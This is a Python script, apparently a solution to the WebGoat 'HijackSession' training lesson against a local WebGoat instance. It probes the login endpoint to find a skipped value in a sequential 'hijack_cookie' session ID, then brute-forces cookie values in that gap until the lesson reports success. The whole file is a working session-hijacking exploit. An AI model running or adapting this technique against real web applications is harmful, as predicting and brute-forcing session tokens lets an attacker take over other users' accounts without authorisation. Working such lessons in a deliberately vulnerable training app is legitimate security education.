import http.client
import re
import time


def POST_WebGoat_HijackSession_login(
        hijack_cookie: str,
) -> http.client.HTTPResponse:
    method, path = 'POST', '/WebGoat/HijackSession/login'
    host, port = 'localhost', 8080
    cookies = ['JSESSIONID=HyneSXzKOXvwy9PEdFBGwNzXdIVgNc5rctz2bJhi']
    if hijack_cookie is not None:
        cookies.append(f'hijack_cookie={hijack_cookie}')
    headers = {
        'Host': 'localhost:8080',
        'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/118.0',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Content-Length': '27',
        'Origin': 'http://localhost:8080',
        'Connection': 'keep-alive',
        'Referer': 'http://localhost:8080/WebGoat/start.mvc?username=testuser1',
        'Cookie': "; ".join(cookies),
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
    }
    body = 'username=test&password=test'
    connection = http.client.HTTPConnection(host, port)
    connection.request(method, path, body, headers)
    return connection.getresponse()


def get_first(response: http.client.HTTPResponse) -> int:
    cookie = response.getheader('Set-Cookie')
    return int(re.search('hijack_cookie=([0-9]+)-[0-9]+;', cookie).group(1))


def get_second(response: http.client.HTTPResponse) -> int:
    cookie = response.getheader('Set-Cookie')
    return int(re.search('hijack_cookie=[0-9]+-([0-9]+);', cookie).group(1))


def get_range():
    first_response = POST_WebGoat_HijackSession_login(None)
    first_first = get_first(first_response)
    time.sleep(1)
    second_response = POST_WebGoat_HijackSession_login(None)
    second_first = get_first(second_response)
    while second_first == first_first + 1:
        print(f"first: {first_first} second: {second_first} Calling again")
        first_response = second_response
        first_first = second_first
        second_response = POST_WebGoat_HijackSession_login(None)
        second_first = get_first(second_response)
        time.sleep(1)
    print(f"first: {first_first} second: {second_first} Success")
    return first_first, second_first, get_second(first_response), get_second(second_response)


def get_cookie():
    first_min, first_max, second_min, second_max = get_range()
    print("Found range: {}-{}, {}-{}".format(first_min, first_max, second_min, second_max))
    for first in range(first_min, first_max):
        for second in range(second_min, second_max):
            time.sleep(0.1)
            resp = POST_WebGoat_HijackSession_login(f'{first}-{second}')
            if second % 100 == 0:
                print(f'{first}-{second}')
            if "\"lessonCompleted\" : false" not in resp.read().decode('utf-8'):
                print(f'{first}-{second} SUCCESS!!!!!!')
                return f'{first}-{second}'
            if resp.status != 200:
                print(f'ERROR {resp.status}')
    return None


cookie = get_cookie()
while cookie is None:
    cookie = get_cookie()
